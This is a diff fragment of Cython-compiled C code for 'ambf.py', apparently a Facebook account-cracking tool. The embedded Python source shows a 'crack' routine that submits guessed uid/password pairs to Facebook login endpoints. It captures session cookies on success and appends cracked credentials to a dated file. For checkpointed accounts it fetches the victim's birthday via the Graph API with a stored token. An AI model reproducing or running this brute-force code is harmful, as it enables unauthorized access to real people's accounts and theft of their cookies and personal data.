+      PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_v_pw);
+      __pyx_t_12 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_10); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 500, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_12);
+      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __pyx_t_10 = NULL;
+      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
+        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
+        if (likely(__pyx_t_10)) {
+          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
+          __Pyx_INCREF(__pyx_t_10);
+          __Pyx_INCREF(function);
+          __Pyx_DECREF_SET(__pyx_t_8, function);
+        }
+      }
+      __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_10, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_12);
+      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
+      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+      if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 500, __pyx_L1_error)
+      __Pyx_GOTREF(__pyx_t_11);
+      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+
+      /* "ambf.py":501
+ * 			ok.append("%s|%s"%(uid, pw))
+ * 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+ * 			break             # <<<<<<<<<<<<<<
+ * 		elif "checkpoint" in ses.cookies.get_dict().keys():
+ * 			try:
+ */
+      goto __pyx_L12_break;
+
+      /* "ambf.py":496
+ * 		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+ * 		gaaa = ses.post(host+"/login/?next&ref=dbl&fl&refid=8",data=kwargs)
+ * 		if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
+ * 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+ */
+    }
+
+    /* "ambf.py":502
+ * 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+ * 			break
+ * 		elif "checkpoint" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
+ * 			try:
+ * 				token = open("login.txt", "r").read()
+ */
+    __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 502, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_12);
+    __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 502, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_10);
+    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+    __pyx_t_12 = NULL;
+    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
+      __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_10);
+      if (likely(__pyx_t_12)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+        __Pyx_INCREF(__pyx_t_12);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_10, function);
+      }
+    }
+    __pyx_t_8 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
+    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+    if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 502, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_8);
+    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+    __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_keys); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 502, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_10);
+    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+    __pyx_t_8 = NULL;
+    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
+      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
+      if (likely(__pyx_t_8)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+        __Pyx_INCREF(__pyx_t_8);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_10, function);
+      }
+    }
+    __pyx_t_11 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
+    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
+    if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 502, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
+    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+    __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_t_11, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 502, __pyx_L1_error)
+    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+    __pyx_t_18 = (__pyx_t_17 != 0);
+    if (__pyx_t_18) {
+
+      /* "ambf.py":503
+ * 			break
+ * 		elif "checkpoint" in ses.cookies.get_dict().keys():
+ * 			try:             # <<<<<<<<<<<<<<
+ * 				token = open("login.txt", "r").read()
+ * 				with requests.Session() as ses:
+ */
+      {
+        __Pyx_PyThreadState_declare
+        __Pyx_PyThreadState_assign
+        __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
+        __Pyx_XGOTREF(__pyx_t_1);
+        __Pyx_XGOTREF(__pyx_t_2);
+        __Pyx_XGOTREF(__pyx_t_3);
+        /*try:*/ {
+
+          /* "ambf.py":504
+ * 		elif "checkpoint" in ses.cookies.get_dict().keys():
+ * 			try:
+ * 				token = open("login.txt", "r").read()             # <<<<<<<<<<<<<<
+ * 				with requests.Session() as ses:
+ * 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+ */
+          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 504, __pyx_L29_error)
           __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-          __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 501, __pyx_L11_error)
+          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_read); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 504, __pyx_L29_error)
           __Pyx_GOTREF(__pyx_t_8);
-          __Pyx_GIVEREF(__pyx_t_10);
-          PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_10);
-          __Pyx_INCREF(__pyx_n_s_a);
-          __Pyx_GIVEREF(__pyx_n_s_a);
-          PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_n_s_a);
-          __pyx_t_10 = 0;
-          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_8, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 501, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 501, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_8);
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __pyx_t_10 = PyTuple_New(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 501, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_INCREF(__pyx_v_uid);
-          __Pyx_GIVEREF(__pyx_v_uid);
-          PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_v_uid);
-          __Pyx_INCREF(__pyx_v_pw);
-          __Pyx_GIVEREF(__pyx_v_pw);
-          PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_v_pw);
-          __pyx_t_12 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_10); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 501, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_12);
           __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
           __pyx_t_10 = NULL;
           if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
@@ -16035,1053 +16124,724 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
               __Pyx_DECREF_SET(__pyx_t_8, function);
             }
           }
-          __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_10, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_12);
+          __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
           __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 501, __pyx_L11_error)
+          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 504, __pyx_L29_error)
           __Pyx_GOTREF(__pyx_t_11);
           __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+          if (PyDict_SetItem(__pyx_d, __pyx_n_s_token, __pyx_t_11) < 0) __PYX_ERR(0, 504, __pyx_L29_error)
           __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
 
-          /* "ambf.py":502
- * 				ok.append("%s|%s"%(uid, pw))
- * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
- * 				break             # <<<<<<<<<<<<<<
- * 			elif "checkpoint" in ses.cookies.get_dict().keys():
- * 				try:
+          /* "ambf.py":505
+ * 			try:
+ * 				token = open("login.txt", "r").read()
+ * 				with requests.Session() as ses:             # <<<<<<<<<<<<<<
+ * 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+ * 					month, day, year = ttl.split("/")
  */
-          goto __pyx_L18_break;
-
-          /* "ambf.py":497
- * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
- * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
- * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
- * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
- * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
- */
-        }
-
-        /* "ambf.py":503
- * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
- * 				break
- * 			elif "checkpoint" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
- * 				try:
- * 					token = open("login.txt", "r").read()
- */
-        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 503, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_12);
-        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 503, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_10);
-        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-        __pyx_t_12 = NULL;
-        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
-          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_10);
-          if (likely(__pyx_t_12)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-            __Pyx_INCREF(__pyx_t_12);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_10, function);
-          }
-        }
-        __pyx_t_8 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
-        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 503, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_8);
-        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_keys); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 503, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_10);
-        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __pyx_t_8 = NULL;
-        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
-          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
-          if (likely(__pyx_t_8)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-            __Pyx_INCREF(__pyx_t_8);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_10, function);
-          }
-        }
-        __pyx_t_11 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
-        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-        if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 503, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        __pyx_t_20 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_t_11, Py_EQ)); if (unlikely(__pyx_t_20 < 0)) __PYX_ERR(0, 503, __pyx_L11_error)
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        __pyx_t_21 = (__pyx_t_20 != 0);
-        if (__pyx_t_21) {
-
-          /* "ambf.py":504
- * 				break
- * 			elif "checkpoint" in ses.cookies.get_dict().keys():
- * 				try:             # <<<<<<<<<<<<<<
- * 					token = open("login.txt", "r").read()
- * 					with requests.Session() as ses:
- */
-          {
-            __Pyx_PyThreadState_declare
-            __Pyx_PyThreadState_assign
-            __Pyx_ExceptionSave(&__pyx_t_19, &__pyx_t_18, &__pyx_t_17);
-            __Pyx_XGOTREF(__pyx_t_19);
-            __Pyx_XGOTREF(__pyx_t_18);
-            __Pyx_XGOTREF(__pyx_t_17);
-            /*try:*/ {
-
-              /* "ambf.py":505
- * 			elif "checkpoint" in ses.cookies.get_dict().keys():
- * 				try:
- * 					token = open("login.txt", "r").read()             # <<<<<<<<<<<<<<
- * 					with requests.Session() as ses:
- * 						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
- */
-              __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 505, __pyx_L35_error)
-              __Pyx_GOTREF(__pyx_t_10);
-              __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_read); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 505, __pyx_L35_error)
-              __Pyx_GOTREF(__pyx_t_8);
-              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-              __pyx_t_10 = NULL;
-              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
-                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
-                if (likely(__pyx_t_10)) {
-                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
-                  __Pyx_INCREF(__pyx_t_10);
-                  __Pyx_INCREF(function);
-                  __Pyx_DECREF_SET(__pyx_t_8, function);
-                }
+          /*with:*/ {
+            __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_requests); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 505, __pyx_L29_error)
+            __Pyx_GOTREF(__pyx_t_8);
+            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_Session); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 505, __pyx_L29_error)
+            __Pyx_GOTREF(__pyx_t_10);
+            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+            __pyx_t_8 = NULL;
+            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
+              __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
+              if (likely(__pyx_t_8)) {
+                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+                __Pyx_INCREF(__pyx_t_8);
+                __Pyx_INCREF(function);
+                __Pyx_DECREF_SET(__pyx_t_10, function);
               }
-              __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
-              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-              if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 505, __pyx_L35_error)
-              __Pyx_GOTREF(__pyx_t_11);
-              __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-              if (PyDict_SetItem(__pyx_d, __pyx_n_s_token, __pyx_t_11) < 0) __PYX_ERR(0, 505, __pyx_L35_error)
-              __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-
-              /* "ambf.py":506
- * 				try:
- * 					token = open("login.txt", "r").read()
- * 					with requests.Session() as ses:             # <<<<<<<<<<<<<<
- * 						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
- * 						month, day, year = ttl.split("/")
- */
-              /*with:*/ {
-                __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_requests); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 506, __pyx_L35_error)
-                __Pyx_GOTREF(__pyx_t_8);
-                __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_Session); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 506, __pyx_L35_error)
-                __Pyx_GOTREF(__pyx_t_10);
-                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-                __pyx_t_8 = NULL;
-                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
-                  __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
-                  if (likely(__pyx_t_8)) {
-                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-                    __Pyx_INCREF(__pyx_t_8);
-                    __Pyx_INCREF(function);
-                    __Pyx_DECREF_SET(__pyx_t_10, function);
-                  }
-                }
-                __pyx_t_11 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
-                __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-                if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 506, __pyx_L35_error)
-                __Pyx_GOTREF(__pyx_t_11);
-                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                __pyx_t_24 = __Pyx_PyObject_LookupSpecial(__pyx_t_11, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 506, __pyx_L35_error)
-                __Pyx_GOTREF(__pyx_t_24);
-                __pyx_t_8 = __Pyx_PyObject_LookupSpecial(__pyx_t_11, __pyx_n_s_enter); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 506, __pyx_L43_error)
-                __Pyx_GOTREF(__pyx_t_8);
-                __pyx_t_12 = NULL;
-                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
-                  __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_8);
-                  if (likely(__pyx_t_12)) {
-                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
-                    __Pyx_INCREF(__pyx_t_12);
-                    __Pyx_INCREF(function);
-                    __Pyx_DECREF_SET(__pyx_t_8, function);
-                  }
-                }
-                __pyx_t_10 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
-                __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-                if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 506, __pyx_L43_error)
-                __Pyx_GOTREF(__pyx_t_10);
-                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-                __pyx_t_8 = __pyx_t_10;
-                __pyx_t_10 = 0;
-                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-                /*try:*/ {
-                  {
-                    __Pyx_PyThreadState_declare
-                    __Pyx_PyThreadState_assign
-                    __Pyx_ExceptionSave(&__pyx_t_25, &__pyx_t_26, &__pyx_t_27);
-                    __Pyx_XGOTREF(__pyx_t_25);
-                    __Pyx_XGOTREF(__pyx_t_26);
-                    __Pyx_XGOTREF(__pyx_t_27);
-                    /*try:*/ {
-                      __Pyx_DECREF_SET(__pyx_v_ses, __pyx_t_8);
-                      __pyx_t_8 = 0;
-
-                      /* "ambf.py":507
- * 					token = open("login.txt", "r").read()
- * 					with requests.Session() as ses:
- * 						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]             # <<<<<<<<<<<<<<
- * 						month, day, year = ttl.split("/")
- * 						month = bulan_ttl[month]
- */
-                      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 507, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_token); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 507, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_12);
-                      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 507, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_6);
-                      __Pyx_INCREF(__pyx_v_uid);
-                      __Pyx_GIVEREF(__pyx_v_uid);
-                      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_uid);
-                      __Pyx_GIVEREF(__pyx_t_12);
-                      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_12);
-                      __pyx_t_12 = 0;
-                      __pyx_t_12 = __Pyx_PyString_Format(__pyx_kp_s_https_graph_facebook_com_s_acces, __pyx_t_6); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 507, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_12);
-                      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-                      __pyx_t_6 = NULL;
-                      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
-                        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_10);
-                        if (likely(__pyx_t_6)) {
-                          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-                          __Pyx_INCREF(__pyx_t_6);
-                          __Pyx_INCREF(function);
-                          __Pyx_DECREF_SET(__pyx_t_10, function);
-                        }
-                      }
-                      __pyx_t_11 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_6, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_12);
-                      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
-                      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-                      if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 507, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_11);
-                      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_json); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 507, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-                      __pyx_t_11 = NULL;
-                      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
-                        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
-                        if (likely(__pyx_t_11)) {
-                          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-                          __Pyx_INCREF(__pyx_t_11);
-                          __Pyx_INCREF(function);
-                          __Pyx_DECREF_SET(__pyx_t_10, function);
-                        }
-                      }
-                      __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
-                      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-                      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 507, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_8);
-                      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                      __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_8, __pyx_n_s_birthday); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 507, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-                      __pyx_v_ttl = __pyx_t_10;
-                      __pyx_t_10 = 0;
-
-                      /* "ambf.py":508
- * 					with requests.Session() as ses:
- * 						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
- * 						month, day, year = ttl.split("/")             # <<<<<<<<<<<<<<
- * 						month = bulan_ttl[month]
- * 						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
- */
-                      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_ttl, __pyx_n_s_split); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 508, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_8);
-                      __pyx_t_11 = NULL;
-                      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
-                        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_8);
-                        if (likely(__pyx_t_11)) {
-                          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
-                          __Pyx_INCREF(__pyx_t_11);
-                          __Pyx_INCREF(function);
-                          __Pyx_DECREF_SET(__pyx_t_8, function);
-                        }
-                      }
-                      __pyx_t_10 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_11, __pyx_kp_s__45) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_s__45);
-                      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-                      if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 508, __pyx_L49_error)
-                      __Pyx_GOTREF(__pyx_t_10);
-                      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-                      if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
-                        PyObject* sequence = __pyx_t_10;
-                        Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
-                        if (unlikely(size != 3)) {
-                          if (size > 3) __Pyx_RaiseTooManyValuesError(3);
-                          else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
-                          __PYX_ERR(0, 508, __pyx_L49_error)
-                        }
-                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-                        if (likely(PyTuple_CheckExact(sequence))) {
-                          __pyx_t_8 = PyTuple_GET_ITEM(sequence, 0); 
-                          __pyx_t_11 = PyTuple_GET_ITEM(sequence, 1); 
-                          __pyx_t_12 = PyTuple_GET_ITEM(sequence, 2); 
-                        } else {
-                          __pyx_t_8 = PyList_GET_ITEM(sequence, 0); 
-                          __pyx_t_11 = PyList_GET_ITEM(sequence, 1); 
-                          __pyx_t_12 = PyList_GET_ITEM(sequence, 2); 
-                        }
-                        __Pyx_INCREF(__pyx_t_8);
-                        __Pyx_INCREF(__pyx_t_11);
-                        __Pyx_INCREF(__pyx_t_12);
-                        #else
